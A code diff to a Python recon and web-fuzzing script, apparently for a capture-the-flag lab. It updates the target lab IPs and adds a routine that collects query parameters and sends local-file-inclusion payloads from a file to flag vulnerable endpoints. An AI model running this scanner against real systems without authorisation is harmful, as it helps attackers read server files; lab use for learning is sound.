@@ -3,7 +3,6 @@ import pandas as pd
 from bs4 import BeautifulSoup
 import requests
 from sys import argv
-import urllib3
 import threading
 import httpx
 from concurrent.futures import ThreadPoolExecutor
@@ -11,14 +10,15 @@ from selenium import webdriver
 from colorama import Fore, Style, init
 import time
 
-ip_1 = "10.10.207.69"
-ip_2 = "10.10.207.70"
+ip_1 = "10.10.248.85"
+ip_2 = "10.10.248.86"
 credentials = []
 services = []
 run_in_background = []
 found_web_directories = []
 links = []
 lfi_results = []
+lfi_candidates = []
 
 class Scanner:
     def __init__(self, ip):
@@ -115,15 +115,43 @@ class WebFuzzing:
         possible_lfi = set()
         for href in hrefs:
             if href and "?" in href:
-                query_part = href.split("?")[1]
-                param = query_part.split("=")[0]
-                result = f"?{param}="
-                if result not in possible_lfi:
-                    possible_lfi.add(result)
-                    lfi_results.append({"Href": href, "Parameter": result})
-        lfi_df = pd.DataFrame(lfi_results)
+                param = href.split("?")[1].split("=")[0] # extract parameter name
+                base_url = href.split("=")[0]
+                full_url = f"http://{self.ip}{web_page}/{base_url}"
+                lfi_candidates.append({'url': full_url, 'href': href, 'Possible vulnerable parameter': param})
+        lfi_df = pd.DataFrame(lfi_candidates)
         print(lfi_df)
 
+    def test_lfi(self, payload_file):
+        negative = ['Failed opening']
+        seen = set()
+        with open(payload_file, 'r') as f:
+            for payload in f:
+                payload = payload.strip()
+                for candidate in lfi_candidates:
+                    url = candidate['url']
+                    param = candidate['Possible vulnerable parameter']
+                    key = (url, param, payload)
+                    if key in seen:
+                        continue
+                    seen.add(key)
+                    response = requests.get(url, params={param: payload})
+                    print(Fore.YELLOW + f"Testing For LFI vulnerability: {url}?{param}={payload}" + Style.RESET_ALL)
+                    if any(neg in response.text for neg in negative):
+                        continue
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    lfi_content = '\n'.join([tag.get_text() for tag in soup.find_all('p')])
+                    if lfi_content:
+                        lfi_results.append({
+                            "Url": f"{url}?{param}={payload}",
+                            "Content": lfi_content,
+                            "Is Vulnerable": "Most Likely Vulnerable"
+                        })
+        lfi_results_df = pd.DataFrame(lfi_results)
+        print(lfi_results_df)
+            
+
+        
 
         
                     
@@ -139,6 +167,8 @@ if __name__ == "__main__":
     #web_actions.httpx_fuzzing()
     test_lfi = WebFuzzing(ip_2, 1)
     test_lfi.locate_lfi('/dev')
+    test_lfi.test_lfi('./lfi_payload')
+    
 
     
 
